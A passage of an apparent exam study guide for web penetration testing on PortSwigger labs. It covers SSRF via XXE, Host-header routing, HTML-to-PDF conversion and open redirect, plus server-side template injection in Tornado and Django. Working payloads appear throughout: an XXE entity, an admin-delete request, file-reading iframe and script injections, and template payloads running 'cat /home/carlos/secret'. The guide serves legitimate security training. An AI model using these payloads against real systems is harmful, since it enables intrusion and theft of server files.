  &lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">test</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>http://localhost:6566/latest/<span class="pl-pds">"</span></span>&gt; ]&gt;
  &lt;<span class="pl-ent">stockCheck</span>&gt;
    &lt;<span class="pl-ent">productId</span>&gt;
      <span class="pl-c1">&amp;xxe;</span>
    &lt;/<span class="pl-ent">productId</span>&gt;
    &lt;<span class="pl-ent">storeId</span>&gt;
      1
    &lt;/<span class="pl-ent">storeId</span>&gt;
  &lt;/<span class="pl-ent">stockCheck</span>&gt;  </pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xxe-ssrf-localhost.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xxe-ssrf-localhost.png" alt="xxe-ssrf-localhost.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" rel="nofollow">PortSwigger Lab: Exploiting XXE to perform SSRF attacks</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">HOST Routing-based SSRF</h3><a id="user-content-host-routing-based-ssrf" class="anchor" aria-label="Permalink: HOST Routing-based SSRF" href="#host-routing-based-ssrf"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> routing-based SSRF by altering the <strong>host</strong> header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost Intranet.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET / HTTP/1.1
Host: 192.168.0.0"><pre class="notranslate"><code>GET / HTTP/1.1
Host: 192.168.0.0
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Routing-based-SSRF.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Routing-based-SSRF.png" alt="Routing-based SSRF" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><strong>Note:</strong> Once access gained to the internal server admin portal, the response indicate the form requires a POST request and CSRF token, so we convert the GET request to POST as below.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /admin/delete HTTP/1.1
Host: 192.168.0.135
Cookie: session=TmaxWQzsf7jfkn5KyT9V6GmeIV1lV75E
Sec-Ch-Ua: &quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Linux&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://TARGET.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg&amp;username=carlos"><pre>POST /admin/delete HTTP/1.1
Host: 192.168.0.135
Cookie: session=TmaxWQzsf7jfkn5KyT9V6GmeIV1lV75E
Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://TARGET.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg&amp;username=carlos</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf" rel="nofollow">PortSwigger Lab: Routing-based SSRF</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">HTML to PDF</h3><a id="user-content-html-to-pdf" class="anchor" aria-label="Permalink: HTML to PDF" href="#html-to-pdf"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><strong>Identify</strong> a PDF download function and the <code>source code</code> uses <code>JSON.stringify</code> to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial <code>source code</code> for JavaScript on the target <code>downloadReport.js</code>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  "><pre><span class="pl-k">function</span> <span class="pl-en">downloadReport</span><span class="pl-kos">(</span><span class="pl-s1">event</span><span class="pl-kos">,</span> <span class="pl-s1">path</span><span class="pl-kos">,</span> <span class="pl-s1">param</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>

body: <span class="pl-c1">JSON</span><span class="pl-kos">.</span><span class="pl-en">stringify</span><span class="pl-kos">(</span><span class="pl-kos">{</span>
  <span class="pl-kos">[</span><span class="pl-s1">param</span><span class="pl-kos">]</span>: <span class="pl-s1">html</span>
  <span class="pl-kos">}</span>
  <span class="pl-kos">)</span><span class="pl-kos"></span>
  </pre></div>
<blockquote>
<p dir="auto"><strong>Note:</strong> The <code>&lt;div&gt;</code> tag defines a division or a section in an HTML document. The </p><div dir="auto"> tag is used as a container for HTML elements - which is then styled with CSS. <a href="https://youtu.be/5djtMMciBlw" rel="nofollow">z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.</a><p dir="auto"></p>
</div></blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;div&gt;&lt;p&gt;Report Heading by &lt;img src=&quot;https://OASTIFY.COM/test.png&quot;&gt;&lt;/p&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">div</span><span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>Report Heading by <span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">https://OASTIFY.COM/test.png</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Identify file download HTML-to-PDF convert function on target is vulnerable.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
	document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');
&lt;/script&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">script</span><span class="pl-c1">&gt;</span>
	document.write('<span class="pl-c1">&lt;</span><span class="pl-s1">iframe</span> <span class="pl-c1">src</span><span class="pl-c1">=</span><span class="pl-s1">file</span>:<span class="pl-c">///etc/passwd&gt;&lt;/iframe&gt;');</span>
&lt;/<span class="pl-s1">script</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/daily-swig/ssrf" rel="nofollow">PortSwigger Research SSRF</a></p>
<blockquote>
<p dir="auto">Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as <code>wkhtmltopdf</code> to read local file, resulting in <a href="http://hassankhanyusufzai.com/SSRF-to-LFI/" rel="nofollow">SSRF to Local File Read Exploit in Hassan's blog</a>.</p>
</blockquote>
<blockquote>
<p dir="auto">Thehackerish showing wkHTMLtoPDF exploitation using <a href="https://www.root-me.org/" rel="nofollow">root-me.org - Gemini-Pentest-v1</a> CTF lab in the video <a href="https://youtu.be/Prqt3N5QU2Q?t=345" rel="nofollow">Pentest SSRF Ep4</a> by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-gemini-pentest-v1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-gemini-pentest-v1.png" alt="root-me ctf Gemini pentest v1" style="max-width: 100%;"></a></p>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;html&gt;
 &lt;body&gt;
  &lt;script&gt;
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open(&quot;GET&quot;, &quot;file:///home/carlos/secret&quot;);
   x.send();
  &lt;/script&gt;
 &lt;/body&gt;
&lt;/html&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span>
 <span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
  <span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
   <span class="pl-s1">x</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">;</span>
   <span class="pl-s1">x</span><span class="pl-kos">.</span><span class="pl-en">onload</span> <span class="pl-c1">=</span> <span class="pl-k">function</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-smi">this</span><span class="pl-kos">.</span><span class="pl-c1">responseText</span><span class="pl-kos">)</span>
   <span class="pl-kos">}</span><span class="pl-kos">;</span>
   <span class="pl-s1">x</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"GET"</span><span class="pl-kos">,</span> <span class="pl-s">"file:///home/carlos/secret"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
   <span class="pl-s1">x</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  <span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
 <span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">html</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">JSON POST request body containing the HTMLtoPDF formatted payload to read local file.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{
 &quot;tableHtml&quot;:&quot;&lt;div&gt;&lt;p&gt;SSRF in HTMLtoPDF&lt;/p&gt;&lt;iframe src='file:///home/carlos/secret' height='500' width='500'&gt;&quot;
}"><pre>{
 <span class="pl-ent">"tableHtml"</span>:<span class="pl-s"><span class="pl-pds">"</span>&lt;div&gt;&lt;p&gt;SSRF in HTMLtoPDF&lt;/p&gt;&lt;iframe src='file:///home/carlos/secret' height='500' width='500'&gt;<span class="pl-pds">"</span></span>
}</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-wkhtmltopdf0.12.4.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-wkhtmltopdf0.12.4.png" alt="root-me ctf wkhtmltopdf 0.12.4" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Above the display name is injected with <code>HTML</code> payload and on export the HTML-to-PDF converter perform SSRF.</p>
</blockquote>
<blockquote>
<p dir="auto">The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf" rel="nofollow">HackTricks - Server Side XSS - Dynamic PDF</a> there is cross site scripting and server side exploits documented.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SSRF Open Redirection</h3><a id="user-content-ssrf-open-redirection" class="anchor" aria-label="Permalink: SSRF Open Redirection" href="#ssrf-open-redirection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The target make <strong>GET</strong> request to the <em><strong>next product</strong></em> on the e-commerce site, using a <strong>path</strong> parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. See product page <code>source code</code> below.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-redirection-code.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-redirection-code.png" alt="ssrf-open-redirection-code.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The <em><strong>identification</strong></em> of this vulnerability is by testing various paths and observing the input path specified is reflected in the response <strong>Location</strong> header.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-edirect-location-reflect.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-edirect-location-reflect.png" alt="SSRF Open Redirect Location reflect" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In this lab they state the admin interface is at <code>http://192.168.0.12:8080/admin</code> but in exam use the <code>localhost:6566</code>.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="https://TARGET.net/product/nextProduct?currentProductId=1&amp;path=http%3a//192.168.0.12%3a8080/admin"><pre class="notranslate"><code>https://TARGET.net/product/nextProduct?currentProductId=1&amp;path=http%3a//192.168.0.12%3a8080/admin
</code></pre></div>
<blockquote>
<p dir="auto">On the POST stock request, replace the StockAPI value with the partial path, not the absolute URL, from the <code>nextProduct</code> GET request URL as the value of the <code>stockAPI</code> parameter.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="stockApi=/product/nextProduct?currentProductId=1&amp;path=http%3a//192.168.0.12%3a8080/admin"><pre class="notranslate"><code>stockApi=/product/nextProduct?currentProductId=1&amp;path=http%3a//192.168.0.12%3a8080/admin
</code></pre></div>
<blockquote>
<p dir="auto">URL-encode payload</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin"><pre class="notranslate"><code>stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-rerdirect.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-rerdirect.png" alt="SSRF Open Redirect" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" rel="nofollow">PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">SSTI - Server Side Template Injection</h2><a id="user-content-ssti---server-side-template-injection" class="anchor" aria-label="Permalink: SSTI - Server Side Template Injection" href="#ssti---server-side-template-injection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#ssti-identified">SSTI Identified</a><br>
<a href="#tornado">Tornado</a><br>
<a href="#django">Django</a><br>
<a href="#freemarker">Freemarker</a><br>
<a href="#erb">ERB</a><br>
<a href="#handlebars">Handlebars</a></p>
<blockquote>
<p dir="auto">Use the web framework native template syntax to inject a malicious payload into a <strong>{{input}}</strong>, which is then executed server-side. Submitting invalid syntax will often result in error message that lead to <em><strong>identifying</strong></em> the template framework. Use PortSwigger <a href="https://portswigger.net/web-security/images/template-decision-tree.png" rel="nofollow">template decision tree</a> to aid in <em><strong>identification</strong></em>.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SSTI Identified</h3><a id="user-content-ssti-identified" class="anchor" aria-label="Permalink: SSTI Identified" href="#ssti-identified"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">SSTI can be <em><strong>identified</strong></em> using the tool <a href="https://github.com/vladko312/SSTImap">SSTImap</a>. The limitations of this tool is that the template expression <code>{{7*7}}</code> results are sometimes only evaluated by another GET request or calling another function in the application, as the <strong>output</strong> is not directly reflected or echoed into the response where the template expression was posted.<br>
Alternative way to <em><strong>identify</strong></em> the template framework is to induce error message by injecting malformed user supplied payloads.</p>
</blockquote>
<p dir="auto"><a href="https://youtu.be/p6ElHfcnlSw" rel="nofollow">Tib3rius give great SSTI explanation on this PortSwigger Web Academy labs tutorial</a></p>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd &quot;cat /home/carlos/secret&quot;"><pre>python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/<span class="pl-k">?</span>message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd <span class="pl-s"><span class="pl-pds">"</span>cat /home/carlos/secret<span class="pl-pds">"</span></span></pre></div>
<blockquote>
<p dir="auto">POST request with the data param to test and send payload using SSTImap tool.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&amp;template=fuzzer&amp;template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'"><pre>python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template<span class="pl-k">?</span>productId=1 --cookie <span class="pl-s"><span class="pl-pds">'</span>session=StolenUserCookie<span class="pl-pds">'</span></span> --method POST --marker fuzzer --data <span class="pl-s"><span class="pl-pds">'</span>csrf=ValidCSRFToken&amp;template=fuzzer&amp;template-action=preview<span class="pl-pds">'</span></span> --engine Freemarker --os-cmd <span class="pl-s"><span class="pl-pds">'</span>cat /home/carlos/secret<span class="pl-pds">'</span></span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sstimap.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sstimap.png" alt="SSTImap Tool" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">SSTI payloads to manually <em><strong>identify</strong></em> vulnerability.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="${{&lt;%[%'&quot;}}%\.,
}}{{7*7}} 

{{fuzzer}}
${fuzzer}
${{fuzzer}}

${7*7}
&lt;%= 7*7 %&gt;
${{7*7}}
#{7*7}
${foobar}

{% debug %}"><pre class="notranslate"><code>${{&lt;%[%'"}}%\.,
}}{{7*7}} 

{{fuzzer}}
${fuzzer}
${{fuzzer}}

${7*7}
&lt;%= 7*7 %&gt;
${{7*7}}
#{7*7}
${foobar}

{% debug %}
</code></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Tornado</h3><a id="user-content-tornado" class="anchor" aria-label="Permalink: Tornado" href="#tornado"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identification</strong></em> of tornado template framework after testing injection with <code>}}{{ 7*7}}</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-ssti.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-ssti.png" alt="Identify SSTI" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Tornado Template can be <em><strong>identified</strong></em> using a <code>}}{{ 7*7}}</code> payload that breakout of current expression and evaluate <code>7*7</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">The <strong>preferred name</strong> functionality in the user account profile page is altered and on blog post comment the output displayed.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="POST /my-account/change-blog-post-author-display HTTP/2
Host: TARGET.net
Cookie: session=fenXl1hfjQBgGkrcmJoK7D8RU3eHkkCd

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')"><pre class="notranslate"><code>POST /my-account/change-blog-post-author-display HTTP/2
Host: TARGET.net
Cookie: session=fenXl1hfjQBgGkrcmJoK7D8RU3eHkkCd

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tornado-template.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tornado-template.png" alt="Tornado Template" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Data extracted from the output response when reloading the blog comment previously saved by a logged in user after changing their preferred display name.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssti-tornado-results.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssti-tornado-results.png" alt="ssti tornado results" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context" rel="nofollow">Lab: Basic server-side template injection code context</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Django</h3><a id="user-content-django" class="anchor" aria-label="Permalink: Django" href="#django"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Django Template uses <code>debug</code> tag to display debugging information.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="${{&lt;%[%'&quot;}}%\,
{% debug %} 
